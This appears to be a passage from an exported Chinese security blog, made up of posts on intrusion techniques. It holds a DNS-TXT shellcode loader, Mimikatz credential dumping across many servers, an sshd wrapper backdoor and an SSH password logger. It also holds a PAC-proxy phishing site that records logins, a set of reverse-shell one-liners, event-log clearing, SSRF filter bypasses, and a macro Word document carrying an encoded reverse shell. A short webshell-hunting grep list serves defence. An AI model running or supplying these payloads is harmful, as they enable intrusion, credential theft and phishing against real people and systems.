windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set LPORT 8887LPORT =&gt; 8887msf exploit(handler) &gt; set LHOST x.x.x.xLHOST =&gt; x.x.x.xmsf exploit(handler) &gt; exploit[*] Started reverse handler on x.x.x.x:8887[*] Starting the payload handler... 我们还需要一个获取TXT记录并执行的脚本，这里我改了一个脚本：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182function Execute-Code&#123;&lt;#.PARAMETER ShelldomainThe domain (or subdomain) whose subbdomain's TXT records would hold shellcode..PARAMETER subdomainsThe number of subdomains which would be used to provide shellcode from their TXT records. .PARAMETER AUTHNSAuthoritative Name Server for the domains..EXAMPLEPS &gt; Execute-CodeThe payload will ask for all required options..EXAMPLEPS &gt; Execute-Code -Shelldomain 32.alteredsecurity.com -SubDomains 5 -AUTHNS f1g1ns2.dnspod.net.Use above from non-interactive shell.#&gt; [CmdletBinding()] Param( [Parameter(Position = 0, Mandatory = $True)] [String] $Shelldomain, [Parameter(Position = 1, Mandatory = $True)] [String] $Subdomains, [Parameter(Position = 2, Mandatory = $True)] [String] $AUTHNS ) function Get-ShellCode &#123; Param( [Parameter()] [String] $Shelldomain ) $i = 1 while ($i -le $subdomains) &#123; $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$Shelldomain $AUTHNS") $temp = $getcommand | select-string -pattern "`"" $tmp1 = "" $tmp1 = $tmp1 + $temp $encdata = $encdata + $tmp1 -replace '\s+', "" -replace "`"", "" $i++ &#125; #$encdata = "" $dec = [System.Convert]::FromBase64String($encdata) $ms = New-Object System.IO.MemoryStream $ms.Write($dec, 0, $dec.Length) $ms.Seek(0,0) | Out-Null $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress) $sr = New-Object System.IO.StreamReader($cs) $sc = $sr.readtoend() return $sc &#125; $Shell = (Get-ShellCode $Shelldomain) #Remove unrequired things from msf shellcode $tmp = $Shell -replace "`n","" -replace '\$buf \+\= ',"," -replace '\[Byte\[\]\] \$buf \=' -replace " " [Byte[]]$sc = $tmp -split ',' #Code Execution logic $code = @" [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);"@ $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru $size = 0x1000 if ($sc.Length -gt 0x1000) &#123;$size = $sc.Length&#125; $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) for ($i=0;$i -le ($sc.Length-1);$i++) &#123;$winFunc::memset([IntPtr]($x.ToInt64()+$i), $sc[$i], 1)&#125; Try &#123; $winFunc::CreateThread(0,0,$x,0,0,0) sleep 100000 &#125; Catch &#123; [system.exception] "caught a system exception" &#125;&#125; 参数说明，Shelldomain为创建txt记录的域名或子域名;subdomains为创建TXT域名的个数，如上面所创建的为3;AUTHNS为域的权威名称服务器，如我使用的狗爹，所以AUTHNS为f1g1ns2.dnspod.net 在32位win7上执行：12PS C:\Users\evi1cg\Desktop&gt; . .\Execute-Code.ps1PS C:\Users\evi1cg\Desktop&gt; Execute-Code -Shelldomain 32.evi1cg.me -subdomains 3 -AUTHNS f1g1ns2.dnspod.net 成功获取meterpreter会话： 64位的请自行修改payload及脚本。 0x04 补充 Metasploit中已经含有此脚本dns_txt_query_exec.rb，此脚本查询TXT记录的顺序为a.domain,b.domain…,下面是一个示例，首先生成payload:1☁ ~ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=103.238.225.222 LPORT=8887 -e x86/alpha_mixed Bufferregister=EDI -f raw &gt; reverse.txt 使用下面的脚本对该文件进行切割：123456789#!/usr/bin/env python#coding=utf-8def txt(string,length): return [string[x:x+length] for x in range(0,len(string),length)]with open('out.txt','w+') as f: line = open('reverse.txt','r').read() line= txt(line,255) for txts in line: f.writelines(txts+'\n\n\n\n') 输出如下： 将这三行分别添加到a.domain,b.domain,c.domain的TXT记录中: 生成exe:1☁ ~ sudo msfvenom -p windows/dns_txt_query_exec DNSZONE=evi1cg.me -f exe &gt; test.exe msf开启监听：12345678msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set LHOST x.x.x.xLHOST =&gt; x.x.x.xmsf exploit(handler) &gt; set LPORT 8887LPORT =&gt; 8887msf exploit(handler) &gt; exploit 运行exe，获得meterpreter: 至于免杀，可以直接生成c格式的shellcode,然后按照打造免杀payload来做。 0x05 小结 本文主要介绍一种执行命令的方式以及nishang的脚本使用，希望能对大家有帮助。]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>metasploit</tag>
        <tag>dns</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tips]]></title>
    <url>%2Farchives%2Ftips.html</url>
    <content type="text"><![CDATA[&lt;?php if (md5(&apos;240610708&apos;) == &quot;0&quot;) { echo &quot;Matches&quot;; } ?&gt;]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>alctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Invoke-Mimikatz.ps1批量获取windows密码]]></title>
    <url>%2Farchives%2FGet_Passwords_with_Invoke-Mimikatz.html</url>
    <content type="text"><![CDATA[通常可以使用以下方式获取登陆windows的密码：1powershell "IEX (New-Object Net.WebClient).DownloadString('http://dwz.cn/1OropX'); Invoke-Mimikatz -DumpCreds" 通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取ntds.dit的hash以后还不一定能破解出来,所以可以通过Mimikatz来获取明文密码，但是一台一台登陆去获取会很慢且不方便，所以这里介绍一个批量的方法： 1.创建共享文件夹：1234cd\mkdir opennet share open=C:\open /grant:everyone,fullicacls C:\open\ /grant Everyone:(OI)(CI)F /t 修改注册表12reg change HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ openreg change HKLM\System\CurrentControlSet\Control\Lsa "EveryoneIncludesAnonymous" 1 修改共享目录到open。 2.在共享目录添加下列文件： 1）执行脚本powershellme.cmd，脚本内容： 12powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.11:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds &gt; \\192.168.1.11\open\%COMPUTERNAME%.txt 2&gt;&amp;1ip是设置共享的主机ip地址。 2）Invoke-Mimikatz.ps1 3）mongoose 4）服务器列表serverlist.txt，换行分割。 3.运行mongoose，默认开启端口8080 4.执行wmic：1wmic /node:@serverlist.txt process call create "\\192.168.1.11\open\powershellme.cmd" 带凭证：1wmic /node:@serverlist.txt /user:PROJECTMENTOR\evi1cg /password:123 process call create "\\192.168.1.11\open\powershellme.cmd" 5.在共享目录看各个服务器的密码吧。 6.清除记录： 1）关掉mongoose,并删除 2）net share open /delete 3）删除共享目录及文件 4）修改注册表 PS:可以使用如下命令开启PowerShell remoting：1psexec @serverlist.txt -u [admin account name] -p [admin account password] -h -d powershell.exe "enable-psremoting -force"]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>mimikatz</tag>
        <tag>密码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[别动我的shell]]></title>
    <url>%2Farchives%2FDon-t_touch_my_shell.html</url>
    <content type="text"><![CDATA[别动我的shellMSF 通过ACL隐藏Bind Shell1root@kali:~# msfvenom -p windows/shell_hidden_bind_tcp LPORT=8889 AHOST=192.168.52.129 -f exe &gt; hidden_shell.exe AHOST 就是攻击者的IP： 将exe上传至受害者PC并运行： 这里端口已经开了。 在同段下其他机器连接该端口： 攻击者连接：]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[powerpreter]]></title>
    <url>%2Farchives%2Fpowerpreter.html</url>
    <content type="text"><![CDATA[powerpreter下载：1PS F:\powerpreter&gt; (new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/samratashok/nishang/master/powerpreter/Powerpreter.psm1","powerpreter.psm1") 加载：1PS F:\powerpreter&gt; Import-Module .\powerpreter.psm1 列出导入的模块中的方法：1PS F:\powerpreter&gt; Get-Command -Module powerpreter 查看模块帮助信息1help Check-VM -full]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux查webshell]]></title>
    <url>%2Farchives%2FWebshell_find.html</url>
    <content type="text"><![CDATA[在网站目录差找如下关键字：123456789101112131415grep -Rn "shell_exec *(" /var/wwwgrep -Rn "base64_decode *(" /var/wwwgrep -Rn "phpinfo *(" /var/wwwgrep -Rn "system *(" /var/wwwgrep -Rn "php_uname *(" /var/wwwgrep -Rn "chmod *(" /var/wwwgrep -Rn "fopen *(" /var/wwwgrep -Rn "fclose *(" /var/wwwgrep -Rn "readfile *(" /var/wwwgrep -Rn "edoced_46esab *(" /var/wwwgrep -Rn "eval *(" /var/wwwgrep -Rn "pwd" /var/wwwgrep -Rn "pass" /var/wwwgrep -Rn "pw" /var/wwwgrep -Rn 密码" /var/www find:1find /www/ -name "*.php" |xargs egrep 'assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\&#123;\"\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode']]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透过程中的SSH]]></title>
    <url>%2Farchives%2FPentest_SSH.html</url>
    <content type="text"><![CDATA[1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行1ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337; 就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。 2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接在肉鸡上执行：1234567[root@localhost ~]# cd /usr/sbin[root@localhost sbin]# mv sshd ../bin[root@localhost sbin]# echo '#!/usr/bin/perl' &gt;sshd[root@localhost sbin]# echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd[root@localhost sbin]# echo 'exec &#123;"/usr/bin/sshd"&#125; "/usr/sbin/sshd",@ARGV,' &gt;&gt;sshd[root@localhost sbin]# chmod u+x sshd[root@localhost sbin]# /etc/init.d/sshd restart 在本机执行：1socat STDIO TCP4:10.18.180.20:22,sourceport=13377 如果你想修改源端口，可以用python的struct标准库实现1234567&gt;&gt;&gt; import struct&gt;&gt;&gt; buffer = struct.pack('&gt;I6',19526)&gt;&gt;&gt; print repr(buffer)'\x00\x00LF'&gt;&gt;&gt; buffer = struct.pack('&gt;I6',13377)&gt;&gt;&gt; print buffer4A 3. 记录SSH客户端连接密码搞定主机后，往往想记录肉鸡SSH连接到其他主机的密码，进一步扩大战果，使用strace命令就行了。在肉鸡上修改要记录密码用户目录的.bashrc，添加一行:1alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -e read.write.connect -s 2048 ssh' 之后查看tmp目录的记录：1grep "read(5" /tmp/.sshpwdxxxxxxxx.log]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过.PAC进行网络钓鱼]]></title>
    <url>%2Farchives%2Fphish_use_pac.html</url>
    <content type="text"><![CDATA[0x00常见网络钓鱼方式 攻击者进行网络钓鱼的方式常有以下几种: 1、通过修改受害者hosts文件(C:\WINDOWS\system32\drivers\etc\hosts)来实现； 2、通过修改受害者dns来实现； 3、已经进入路由器，直接修改路由器的DNS。 罗列的并不全，之后遇到的话再补充，上述三种方式很常见。 1: 修改HOSTS文件，即攻击者修改受害者HOSTS文件为如下形式： 127.0.0.1 localhostx.x.x.x www.wooyun.com 这样就受害者访问www.wooyun.com会直接访问到x.x.x.x。在msf中可以使用[inject_host](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/inject_host.rb)脚本来实现。 2：修改dns进行攻击：攻击者可以使用如下命令修改受害者的dns地址(管理员身份执行)： 12345678910C:\Windows\system32&gt;netsh interface ip show interfacesIdx Met MTU 状态 名称--- --- ----- ----------- ------------------- 1 50 4294967295 connected Loopback Pseudo-Interface 1 10 10 1500 connected 本地连接C:\Windows\system32&gt;netsh interface ip set dns "本地连接" static 192.168.1.100C:\Windows\system32&gt;ipconfig /all | findstr 192.168.1.100 DNS 服务器 . . . . . . . . . . . : 192.168.1.100 这样就修改了受害者的DNS地址，之后可以使用msf的 fakedns来架设dns服务器来修改域名的解析地址。 除了直接修改路由器的DNS地址的以上两种方式在某些环境下还是有一些缺点的，例如，一些牛逼的AV会检测到文件的修改而发出报警，除此之外，如果受害者所处内网环境中的防火墙或路由器拦截对外部的DNS请求，修改受害者DNS的攻击方式并不能生效（因为攻击者架设的DNS在外网环境下）。 0x01通过PAC代理 本文主要介绍的是Metasploit中的一个模块ie_proxypac。通过.PAC(自动配置代理)文件来完全控制IE的用户流量。只需要修改PAC文件，攻击者就能使受害者访问的某个域名指向攻击者的IP。虽然没有修改DNS但是可以达到同样的效果，且这种方式较为隐蔽。已经有很多人使用这种方式进行网络钓鱼。 下面是一个PAC文件示例：123456789function FindProxyForURL(url, host)&#123;if (shExpMatch(host, "www.wooyun.org")) &#123; return "PROXY 192.168.52.129:80; DIRECT";&#125;if (shExpMatch(host, "www.baidu.com")) &#123; return "PROXY 192.168.52.129:80; DIRECT";&#125;&#125; 这个文件的配置是当受害者访问www.wooyun.com以及www.baidu.com时，他会直接请求到攻击者ip（ 192.168.52.129）。 详细的PAC编.P写请查看http://findproxyforurl.com/pac-functions/。 将以上脚本保存为test.pac，在获取meterpreter会话的基础上使用ie_proxypac脚本:1234567891011121314151617181920212223meterpreter &gt; background [*] Backgrounding session 1...msf &gt; use post/windows/manage/ie_proxypac msf post(ie_proxypac) &gt; set session 1session =&gt; 1msf post(ie_proxypac) &gt; set REMOTE_PAC http://192.168.52.129/test.pacREMOTE_PAC =&gt; http://192.168.52.129/test.pacmsf post(ie_proxypac) &gt; show options Module options (post/windows/manage/ie_proxypac): Name Current Setting Required Description ---- --------------- -------- ----------- AUTO_DETECT false yes Automatically detect settings. DISABLE_PROXY false yes Disable the proxy server. LOCAL_PAC no Local PAC file. REMOTE_PAC http://192.168.52.129/test.pac no Remote PAC file. (Ex: http://192.168.1.20/proxy.pac) SESSION 1 yes The session to run this module on.msf post(ie_proxypac) &gt; exploit [*] Setting automatic configuration script from local PAC file ...[+] Automatic configuration script configured...[*] Post module execution completed 之后打开ie，internet选项-&gt;连接-&gt;局域网设置： 可以看到pac已经使用pac文件进行了代理。 代理尽量使用远程代理，因为IE11默认禁止本地代理，如果使用本地代理，代理是无效的。详情测试发现，如果连接了vpn，pac代理是失效的。 现在再访问www.baidu.com,www.wooyun.org，会看到已经转移到了我们制定的ip： 0x02能做什么 这里我们修改pac文件如下：123456function FindProxyForURL(url, host)&#123;if (shExpMatch(host, "www.wooyun.org")) &#123; return "PROXY 192.168.52.129:80; DIRECT";&#125;&#125; 这里ip要改成自己的web的ip，如果受害者请求的网站host为 www.wooyun.org 时，满足规则，然后跳转到我们指定的ip地址，这里我们可以来构造钓鱼。打开wooyun,右键查看源代码，将所有源代码保存为index.html，放在网站根目录下，因为当受害者请求 http://wooyun.org，其host为 wooyun.org 不满足代理条件，就会直接请求，所以我们把源代码中的www.wooyun.org，改为wooyun.org: 然后找到url，src，href标签，修改为http://wooyun.org/xxxx 的形式，比如1&lt;link href="/css/style.css?v=201501291909" rel="stylesheet" type="text/css"/&gt; 修改为1&lt;link href="http://wooyun.org/css/style.css?v=201501291909" rel="stylesheet" type="text/css"/&gt; 改完以后，基本上就算克隆成功了： 下来要把登陆页面的的源码复制过来，打开http://www.wooyun.org/user.php?action=login，右键复制源码，保存为user.php，放在网站根目录下，修改源码中的url，src，href。修改完之后，打开index.html文件，定位`登录`，修改href为 user.php?action=login，修改以后此标签为：1&lt;a href="user.php?action=login"&gt;登录&lt;/a&gt; | &lt;a href="http://wooyun.org/user.php?action=register" class="reg"&gt;注册&lt;/a&gt; 打开user.php,定位用户登录表单，修改表单action为post.php:1234&lt;a href="#"&gt;用户登录&lt;/a&gt;&lt;/div&gt; &lt;/div&gt;&lt;form action="post.php" method="POST"&gt; ..... 在网站根目录新建post.php，添加如下代码：1&lt;?php $file = 'data.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?&gt;&lt;meta http-equiv="refresh" content="0; url=http://wooyun.org/user.php?action=login" /&gt; 这样钓鱼站就搭建好了。当用户登录时： 点击登陆以后会跳转到http://wooyun.org/user.php?action=login 查看data.txt: 只是简单地一个示例，具体可以通过修改pac文件来实现控制浏览器是否进行代理。 0x03 小结此种方式进行网络钓鱼，做的细致的话，很难被发现，而且隐蔽性好，缺点就是连接vpn以后代理将会失效。以上是个人的测试结果，请各位大牛指正。]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>网络钓鱼</tag>
        <tag>pac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Powershell Gethash]]></title>
    <url>%2Farchives%2FPowershell_Gethash.html</url>
    <content type="text"><![CDATA[使用powershell远程调用来抓取管理hash。在线导hash1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes 在线导明文1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>gethash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[域渗透中找DC]]></title>
    <url>%2Farchives%2F15.html</url>
    <content type="text"><![CDATA[1.net view1net view /domain 2.set log1set log 3.通过srv记录1nslookup -type=SRV _ldap._tcp.corp 4.使用nltest1nltest /dclist:corp 5.使用dsquery1DsQuery Server -domain corp 6.使用netdom1netdom query pdc 这些都是win系统自带的命令，有的时候win版本不同，有的命令会不存在，所以多一种方法，多一种成功的可能性，实际渗透，自行根据目标环境变换]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>dc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透过程中的端口反弹]]></title>
    <url>%2Farchives%2FGetShellls.html</url>
    <content type="text"><![CDATA[反弹的各种姿势。bash版本：1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 注意这个是由解析shell的bash完成，所以某些情况下不支持 perl版本:1perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' python版本:1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' php版本：1php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' ruby版本：1ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' nc版本：1nc -e /bin/sh 223.8.200.234 1234 nc不使用-e：12mknod /tmp/backpipe p/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe mknod:1mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe java版本：123r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/202.103.243.122/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])p.waitFor() lua版本：1lua -e "require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>bind</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令行下的信息搜集]]></title>
    <url>%2Farchives%2FGet_Informations.html</url>
    <content type="text"><![CDATA[使用wmic识别安装到系统中的补丁情况1C:\&gt; wmic qfe get description,installedOn 识别正在运行的服务12C:\&gt;sc query type= serviceC:\&gt;net start 识别开机启动的程序，包括路径1C:\&gt;wmic startup list full ping探测存活主机1D:\&gt;for /L %I in (100,1,254) DO @ping -w 1 -n 1 10.18.180.%I | findstr "TTL=" &gt;&gt; pinglive.txt 查看系统中网卡的IP地址和MAC地址1D:\&gt;wmic nicconfig get ipaddress,macaddress 查看当前系统是否有屏保保护，延迟是多少1D:\&gt;wmic desktop get screensaversecure,screensavertimeout 查看系统中开放的共享12D:\&gt;wmic share get name,pathD:\&gt;net share 查看系统中开启的日志1C:\&gt;wmic nteventlog get path,filename,writeable 清除相关的日志（这里是全部清除）123wevtutil cl "windows powershell"wevtutil cl "security"wevtutil cl "system" 查看系统中安装的软件以及版本1C:\&gt;wmic product get name,version 查看某个进程的详细信息 （路径，命令行参数等）1C:\&gt;wmic process where name="chrome.exe" list full 终止一个进程12D:\&gt;wmic process where name="xshell.exe" call terminateD:\&gt;ntsd -c q -p 进程的PID 显示系统中的曾经连接过的无线密码12D:\&gt;netsh wlan show profiles D:\&gt;netsh wlan show profiles name="profiles的名字" key=clear 查看当前系统是否是VMWARE1C:\&gt;wmic bios list full | find /i "vmware"]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>information</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF中的绕过姿势]]></title>
    <url>%2Farchives%2FSSRF_Bypass.html</url>
    <content type="text"><![CDATA[从以下URL关键字中寻找SSRF漏洞：1234567891011121314sharewapurllinksrcsourcetargetu3gdisplaysourceURlimageURLdomain... http://127.0.0.1/ 被过滤的时候，可以尝试一下几种方式： 1、@1http://abc@127.0.0.1 2、添加端口号1http://127.0.0.1:8080 3、短地址1http://dwz.cn/11SMa 4、可以指向任意ip的域名：xip.io123456710.0.0.1.xip.io 10.0.0.1www.10.0.0.1.xip.io 10.0.0.1mysite.10.0.0.1.xip.io 10.0.0.1foo.bar.10.0.0.1.xip.io 10.0.0.1 5、ip地址转换成进制来访问1115.239.210.26 ＝ 16373751032 首先把这四段数字给 转成 16 进制！结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制！访问使用http://00+转换后十六进制1115.239.210.26 = 0x73.0xef.0xd2.0x1a 八进制1115.239.210.26 = 0163.0357.0322.0032]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用powershell Client进行有效钓鱼]]></title>
    <url>%2Farchives%2FPowershell_client.html</url>
    <content type="text"><![CDATA[0x00 简介Powershell是windows下面非常强大的命令行工具，并且在windows中Powershell可以利用.NET Framework的强大功能，也可以调用windows API，在win7/server 2008以后，powershell已被集成在系统当中。 除此之外，使用powershell能很好的bypass各种AV，在渗透测试中可谓是一个神器。此次使用的是开源的powershell脚本集nishang中的client来制作钓鱼文件。其中office类型文件可以达到钓鱼目的的前提是office已经启用宏。 0x01制作word钓鱼文件下载powercat （powershell的nc） 加载powercat ：123PS G:\github\Pentest\powershell\powercat-master&gt; . .\powercat.ps1PS G:\github\Pentest\powershell\powercat-master&gt; powercatYou must select either client mode (-c) or listen mode (-l). 加载以后使用powercat开启监听：12345PS G:\github\Pentest\powershell\powercat-master&gt; powercat -l -v -p 4444详细信息: Set Stream 1: TCP详细信息: Set Stream 2: Console详细信息: Setting up Stream 1...详细信息: Listening on [0.0.0.0] (port 4444) 测试加载Invoke-PowerShellTcp并执行：12PS G:\github\Pentest\powershell\nishang-master\Shells&gt; . .\Invoke-PowerShellTcp.ps1PS G:\github\Pentest\powershell\nishang-master\Shells&gt; Invoke-PowerShellTcp -Reverse -IPAddress 127.0.0.1 -Port 4444 执行结果如下图： 可以发现，直接获取了一个powershell的shell。下面制作word文件。复制nishang中Invoke-PowerShellTcpOneLine.ps1 client代码，如下： 1$client = New-Object System.Net.Sockets.TCPClient("192.168.52.129",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close() 使用Invoke-Encode.ps1进行编码,编码之前记得要修改ip以及自己要监听的端口123456789PS G:\github\Pentest\powershell\nishang-master\Shells&gt; cd ..\Utility\PS G:\github\Pentest\powershell\nishang-master\Utility&gt; . .\Invoke-Encode.ps1PS G:\github\Pentest\powershell\nishang-master\Utility&gt; Invoke-Encode -DataToEncode '$client = New-Object System.Net.Sockets.TCPClient("192.168.52.129",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()' -IsString -PostScriptCommandEncoded data written to .\encoded.txtEncoded command written to .\encodedcommand.txt 复制encodedcommand.txt的代码如下：1Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('TVHNasJAEL4X+g5DSMsuNUtMG6mGCm1oi1CiNEIP4mFNBpMao5gRFfXdu5uY1L3MMHx/M2tGWYo5wQsEuLOGs1+MCMJDQbgUAZIIV9ECqRBjf+SXSGa0u45od56Fq4rTNVpP6nHPLGiDcqmEzEpSfCKF5YxxbzI7EE6mU1PXQoFsITqu++ie7o722dslaYaMmammV0LiG2XMKnwL7BZUrfjCfE4J52DlCDY/emYsSSoeu1rAGh/WGMgl1quMcU/iNfQHg/c8WsVpPueXfKqtXbRJqjfBPJ7JaKFFU9xD5eD079twguGWrIoGV1AHyuQ18QGMUQiGqmy9i7kYSUr0sA/GhaMMtfyEdDC8ZJr2emXGMtubzsT+HZoTi59NSsgaHZW76evzNNiPbFskjJ+9+lf8bFUg47c3fw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd(); 加载Out-Word.ps1并生成后门，这里要注意，要把payload里面的单引号多加一个单引号！12345PS G:\github\Pentest\powershell\nishang-master\Utility&gt; . ..\Client\Out-Word.ps1PS G:\github\Pentest\powershell\nishang-master\Utility&gt; Out-Word -Payload 'powershell -c Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(''TVHNasJAEL4X+g5DSMsuNUtMG6mGCm1oi1CiNEIP4mFNBpMao5gRFfXdu5uY1L3MMHx/M2tGWYo5wQsEuLOGs1+MCMJDQbgUAZIIV9ECqRBjf+SXSGa0u45od56Fq4rTNVpP6nHPLGiDcqmEzEpSfCKF5YxxbzI7EE6mU1PXQoFsITqu++ie7o722dslaYaMmammV0LiG2XMKnwL7BZUrfjCfE4J52DlCDY/emYsSSoeu1rAGh/WGMgl1quMcU/iNfQHg/c8WsVpPueXfKqtXbRJqjfBPJ7JaKFFU9xD5eD079twguGWrIoGV1AHyuQ18QGMUQiGqmy9i7kYSUr0sA/GhaMMtfyEdDC8ZJr2emXGMtubzsT+HZoTi59NSsgaHZW76evzNNiPbFskjJ+9+lf8bFUg47c3fw=='')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();'Saved to file G:\github\Pentest\powershell\nishang-master\Utility\Salary_Details.doc0PS G:\github\Pentest\powershell\nishang-master\Utility&gt; 执行word以后，则会反弹shell，在启用宏的计算机上没有任何提示，未启用宏的计算机会有启用宏的提示: 获取反弹的powershell可以很容易的升级到metasploit的meterpreter。 0x02制作excel钓鱼文件首先使用msf的web_delivery开启一个powershell的监听：12345678910msf &gt; use exploit/multi/script/web_delivery msf exploit(web_delivery) &gt; set target 2target =&gt; 2msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; 